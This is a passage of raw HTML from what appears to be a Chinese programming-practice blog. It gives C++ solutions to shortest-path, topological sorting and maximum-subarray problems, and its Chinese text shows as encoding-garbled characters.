class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX = <span class="number">0x3f3f</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> gra[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i == j) gra[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> gra[i][j] = MAX;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> a, b, c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="keyword">if</span>(c &lt; gra[a][b])&#123;</span><br><span class="line">gra[a][b] = c;</span><br><span class="line">gra[b][a] = c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(gra[k][i] == MAX &amp;&amp; gra[i][j] == MAX) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(gra[k][j] == MAX || gra[k][j] &gt; gra[k][i] + gra[i][j])&#123;</span><br><span class="line">gra[k][j] = gra[k][i] + gra[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; gra[<span class="number">1</span>][n] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="ç¡®å®šæ¯”èµ›åæ¬¡"><a href="#ç¡®å®šæ¯”èµ›åæ¬¡" class="headerlink" title="ç¡®å®šæ¯”èµ›åæ¬¡"></a>ç¡®å®šæ¯”èµ›åæ¬¡</h3><h5 id="é¢˜ç›®æè¿°-37"><a href="#é¢˜ç›®æè¿°-37" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æœ‰Nä¸ªæ¯”èµ›é˜Ÿï¼ˆ1&lt;=N&lt;=500ï¼‰ï¼Œç¼–å·ä¾æ¬¡ä¸º1ï¼Œ2ï¼Œ3ï¼Œã€‚ã€‚ã€‚ã€‚ï¼ŒNè¿›è¡Œæ¯”èµ›ï¼Œæ¯”èµ›ç»“æŸåï¼Œè£åˆ¤å§”å‘˜ä¼šè¦å°†æ‰€æœ‰å‚èµ›é˜Ÿä¼ä»å‰å¾€åä¾æ¬¡æ’åï¼Œä½†ç°åœ¨è£åˆ¤å§”å‘˜ä¼šä¸èƒ½ç›´æ¥è·å¾—æ¯ä¸ªé˜Ÿçš„æ¯”èµ›æˆç»©ï¼ŒåªçŸ¥é“æ¯åœºæ¯”èµ›çš„ç»“æœï¼Œå³P1èµ¢P2ï¼Œç”¨P1ï¼ŒP2è¡¨ç¤ºï¼Œæ’åæ—¶P1åœ¨P2ä¹‹å‰ã€‚ç°åœ¨è¯·ä½ ç¼–ç¨‹åºç¡®å®šæ’åã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-35"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-35" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-37"><a href="#è¾“å…¥æè¿°-37" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æœ‰è‹¥å¹²ç»„ï¼Œæ¯ç»„ä¸­çš„ç¬¬ä¸€è¡Œä¸ºäºŒä¸ªæ•°Nï¼ˆ<span class="number">1</span>&lt;<span class="symbol">=N</span>&lt;<span class="number">=500</span>ï¼‰ï¼ŒMï¼›å…¶ä¸­Nè¡¨ç¤ºé˜Ÿä¼çš„ä¸ªæ•°ï¼ŒMè¡¨ç¤ºæ¥ç€æœ‰Mè¡Œçš„è¾“å…¥æ•°æ®ã€‚æ¥ä¸‹æ¥çš„Mè¡Œæ•°æ®ä¸­ï¼Œæ¯è¡Œä¹Ÿæœ‰ä¸¤ä¸ªæ•´æ•°<span class="built_in">P1</span>ï¼Œ<span class="built_in">P2</span>è¡¨ç¤ºå³<span class="built_in">P1</span>é˜Ÿèµ¢äº†<span class="built_in">P2</span>é˜Ÿã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-37"><a href="#è¾“å‡ºæè¿°-37" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç»™å‡ºä¸€ä¸ªç¬¦åˆè¦æ±‚çš„æ’åã€‚è¾“å‡ºæ—¶é˜Ÿä¼å·ä¹‹é—´æœ‰ç©ºæ ¼ï¼Œæœ€åä¸€ååé¢æ²¡æœ‰ç©ºæ ¼ã€‚</span><br><span class="line"></span><br><span class="line">å…¶ä»–è¯´æ˜ï¼šç¬¦åˆæ¡ä»¶çš„æ’åå¯èƒ½ä¸æ˜¯å”¯ä¸€çš„ï¼Œæ­¤æ—¶è¦æ±‚è¾“å‡ºæ—¶ç¼–å·å°çš„é˜Ÿä¼åœ¨å‰ï¼›è¾“å…¥æ•°æ®ä¿è¯æ˜¯æ­£ç¡®çš„ï¼Œå³è¾“å…¥æ•°æ®ç¡®ä¿ä¸€å®šèƒ½æœ‰ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„æ’åã€‚</span><br></pre></td></tr></table></figure><p>æ‹“æ‰‘æ’åº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">505</span>;</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line"><span class="keyword">int</span> mpt[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">toposort</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; q;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(d[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">int</span> now = q.<span class="built_in">top</span>();</span><br><span class="line">ans.<span class="built_in">push_back</span>(now);</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(mpt[now][i] == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(--d[i] == <span class="number">0</span>)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">int</span> a, b;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="built_in">memset</span>(mpt, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(mpt));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="keyword">if</span>(mpt[a][b] == <span class="number">0</span>)&#123;</span><br><span class="line">mpt[a][b] = <span class="number">1</span>;</span><br><span class="line">d[b]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; ans = <span class="built_in">toposort</span>(n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ans.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">cout &lt;&lt; ans[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h1><p>åˆ†è€Œæ²»ä¹‹</p><p>æœ€åä¸€ç« äº†ï¼</p><h2 id="é€’æ¨"><a href="#é€’æ¨" class="headerlink" title="é€’æ¨"></a>é€’æ¨</h2><p>æ¯”è¾ƒé‡è¦çš„å°±æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—äº†ï¼Œf[n] = f[n-1] + f[n-2]</p><h2 id="æœ€å¤§å­—æ®µå’Œ"><a href="#æœ€å¤§å­—æ®µå’Œ" class="headerlink" title="æœ€å¤§å­—æ®µå’Œ"></a>æœ€å¤§å­—æ®µå’Œ</h2><h3 id="æœ€å¤§åºåˆ—å’Œ"><a href="#æœ€å¤§åºåˆ—å’Œ" class="headerlink" title="æœ€å¤§åºåˆ—å’Œ"></a>æœ€å¤§åºåˆ—å’Œ</h3><h5 id="é¢˜ç›®æè¿°-38"><a href="#é¢˜ç›®æè¿°-38" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>ç»™å‡ºä¸€ä¸ªæ•´æ•°åºåˆ—Sï¼Œå…¶ä¸­æœ‰Nä¸ªæ•°ï¼Œå®šä¹‰å…¶ä¸­ä¸€ä¸ªéç©ºè¿ç»­å­åºåˆ—Tä¸­æ‰€æœ‰æ•°çš„å’Œä¸ºTçš„â€œåºåˆ—å’Œâ€ã€‚ å¯¹äºSçš„æ‰€æœ‰éç©ºè¿ç»­å­åºåˆ—Tï¼Œæ±‚æœ€å¤§çš„åºåˆ—å’Œã€‚ å˜é‡æ¡ä»¶ï¼šNä¸ºæ­£æ•´æ•°ï¼ŒNâ‰¤1000000ï¼Œç»“æœåºåˆ—å’Œåœ¨èŒƒå›´ï¼ˆ-2^63,2^63-1ï¼‰ä»¥å†…ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-36"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-36" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-38"><a href="#è¾“å…¥æè¿°-38" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ­£æ•´æ•°<span class="built_in">N</span>ï¼Œç¬¬äºŒè¡Œä¸º<span class="built_in">N</span>ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºåºåˆ—ä¸­çš„æ•°ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-38"><a href="#è¾“å‡ºæè¿°-38" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥å¯èƒ½åŒ…æ‹¬å¤šç»„æ•°æ®ï¼Œå¯¹äºæ¯ä¸€ç»„è¾“å…¥æ•°æ®ï¼Œ</span><br><span class="line">ä»…è¾“å‡ºä¸€ä¸ªæ•°ï¼Œè¡¨ç¤ºæœ€å¤§åºåˆ—å’Œã€‚</span><br></pre></td></tr></table></figure><p>èŒƒå›´æ¯”è¾ƒå¤§ï¼Œè¦åˆå§‹åŒ–longlong</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">1000005</span>], d[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> maxx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line">d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">maxx = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i<span class="number">-1</span>]+a[i], a[i]);</span><br><span class="line">maxx = <span class="built_in">max</span>(maxx, d[i]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; maxx &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²åŒºé—´ç¿»è½¬"><a href="#å­—ç¬¦ä¸²åŒºé—´ç¿»è½¬" class="headerlink" title="å­—ç¬¦ä¸²åŒºé—´ç¿»è½¬"></a>å­—ç¬¦ä¸²åŒºé—´ç¿»è½¬</h3><h5 id="é¢˜ç›®æè¿°-39"><a href="#é¢˜ç›®æè¿°-39" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å°è¯ºæœ‰ä¸€ä¸ªç”±0å’Œ1ç»„æˆçš„å­—ç¬¦ä¸²<br>ç°åœ¨å°è¯ºæœ‰ä¸€æ¬¡æœºä¼šï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªä»»æ„çš„åŒºé—´[L,R]ï¼Œå°†è¯¥åŒºé—´å†…çš„æ‰€æœ‰å­—ç¬¦ä¸²è¿›è¡Œç¿»è½¬(å³0-&gt;1,1-&gt;0)ã€‚<br>è¯·é—®å°è¯ºç»è¿‡ä¸€æ¬¡ç¿»è½¬ä¹‹åå­—ç¬¦ä¸²ä¸­æœ€å¤šä¼šæœ‰å¤šå°‘ä¸ª1ï¼Ÿ </p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-37"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-37" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-39"><a href="#è¾“å…¥æè¿°-39" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°<span class="built_in">n</span>ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²é•¿åº¦ï¼Œ<span class="built_in">n</span>&lt;=<span class="number">10</span>^<span class="number">7</span>ã€‚ </span><br><span class="line">æ¥ä¸‹æ¥ä¸€è¡Œä¸€ä¸ªè¾“å…¥ä¸€ä¸ª<span class="number">01</span>å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-39"><a href="#è¾“å‡ºæè¿°-39" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºé¢˜ç›®è¦æ±‚çš„ç­”æ¡ˆã€‚</span><br></pre></td></tr></table></figure><p>æœ€å¤§è¿ç»­å­ä¸²å¯ä»¥æ˜ å°„åˆ°æœ€å¤§åºåˆ—å’Œé—®é¢˜ï¼Œè¿™é¢˜è¦æ‰¾æœ€å¤š0çš„ä¸ªæ•°ï¼ŒæŠŠ0å˜æˆ1ï¼Œ1å˜æˆ-1ï¼Œé‚£å°±æ˜¯æ ‡å‡†çš„æœ€å¤§è¿ç»­åºåˆ—å’Œäº†ï¼›</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10000005</span>];</span><br><span class="line"><span class="keyword">int</span> d[<span class="number">10000005</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">a[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i<span class="number">-1</span>]+a[i], a[i]);</span><br><span class="line">ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§è¿ç»­å­åºåˆ—"><a href="#æœ€å¤§è¿ç»­å­åºåˆ—" class="headerlink" title="æœ€å¤§è¿ç»­å­åºåˆ—"></a>æœ€å¤§è¿ç»­å­åºåˆ—</h3><h5 id="é¢˜ç›®æè¿°-40"><a href="#é¢˜ç›®æè¿°-40" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>ç»™å®šKä¸ªæ•´æ•°çš„åºåˆ—{ N1, N2, â€¦, NK }ï¼Œå…¶ä»»æ„è¿ç»­å­åºåˆ—å¯è¡¨ç¤ºä¸º{ Ni, Ni+1, â€¦, Nj }ï¼Œå…¶ä¸­ 1 &lt;= i &lt;= j &lt;= Kã€‚æœ€å¤§è¿ç»­å­åºåˆ—æ˜¯æ‰€æœ‰è¿ç»­å­åºåˆ—ä¸­å…ƒç´ å’Œæœ€å¤§çš„ä¸€ä¸ªï¼Œä¾‹å¦‚ç»™å®šåºåˆ—{ -2, 11, -4, 13, -5, -2 }ï¼Œå…¶æœ€å¤§è¿ç»­å­åºåˆ—ä¸º{ 11, -4, 13 }ï¼Œæœ€å¤§å’Œä¸º20ã€‚ç°åœ¨å¢åŠ ä¸€ä¸ªè¦æ±‚ï¼Œå³è¿˜éœ€è¦è¾“å‡ºè¯¥å­åºåˆ—çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå…ƒç´ ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-38"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-38" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-40"><a href="#è¾“å…¥æè¿°-40" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•è¾“å…¥åŒ…å«è‹¥å¹²æµ‹è¯•ç”¨ä¾‹ï¼Œæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹å <span class="number">2</span>è¡Œï¼Œç¬¬<span class="number">1</span>è¡Œç»™å‡ºæ­£æ•´æ•°<span class="built_in">K</span><span class="punctuation">(</span> <span class="built_in">K</span><span class="operator">&lt;</span> <span class="number">10000</span> <span class="punctuation">)</span>ï¼Œç¬¬<span class="number">2</span>è¡Œç»™å‡º<span class="built_in">K</span>ä¸ªæ•´æ•°ï¼Œä¸­é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚å½“<span class="built_in">K</span>ä¸º<span class="number">0</span>æ—¶ï¼Œè¾“å…¥ç»“æŸï¼Œè¯¥ç”¨ä¾‹ä¸è¢«å¤„ç†ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-40"><a href="#è¾“å‡ºæè¿°-40" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåœ¨<span class="number">1</span>è¡Œé‡Œè¾“å‡ºæœ€å¤§å’Œã€æœ€å¤§è¿ç»­å­åºåˆ—çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå…ƒç´ ï¼Œä¸­é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚å¦‚æœæœ€å¤§è¿ç»­å­åºåˆ—ä¸å”¯ä¸€ï¼Œåˆ™è¾“å‡ºåºå·<span class="selector-tag">i</span>å’Œjæœ€å°çš„é‚£ä¸ªï¼ˆå¦‚è¾“å…¥æ ·ä¾‹çš„ç¬¬<span class="number">2</span>ã€<span class="number">3</span>ç»„ï¼‰ã€‚è‹¥æ‰€æœ‰Kä¸ªå…ƒç´ éƒ½æ˜¯è´Ÿæ•°ï¼Œåˆ™å®šä¹‰å…¶æœ€å¤§å’Œä¸º<span class="number">0</span>ï¼Œè¾“å‡ºæ•´ä¸ªåºåˆ—çš„é¦–å°¾å…ƒç´ ã€‚</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯å·¦å³è¾¹ç•Œçš„åˆ¤æ–­ï¼Œæœ‰äººæ˜¯åªæ‰¾æœ€å¤§å­åºåˆ—å’Œçš„å³è¾¹ç•Œï¼Œç„¶åä¸€ç›´å¾€å‰å‡å‡åˆ°0ä¸ºæ­¢å¾—åˆ°å·¦è¾¹ç•Œï¼Œæ¯”è¾ƒå®¹æ˜“æƒ³åˆ°</p><p>å¦‚æœè¦åœ¨å¾—åˆ°æœ€å¤§å­åºåˆ—çš„æ—¶å€™å¾—åˆ°å·¦è¾¹ç•Œï¼Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯d[i-1]å°äº0å¹¶ä¸”è¿™ä¸€è½®çš„d[i]è¦æ¯”ç°æœ‰å­åºåˆ—å¤§ï¼ˆç›´æ¥æŠŠå‰é¢ç®—çš„å­åºåˆ—å’Œèˆå¼ƒæ‰ï¼‰ï¼›å³è¾¹ç•Œæ¯”è¾ƒå¥½æ‰¾ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 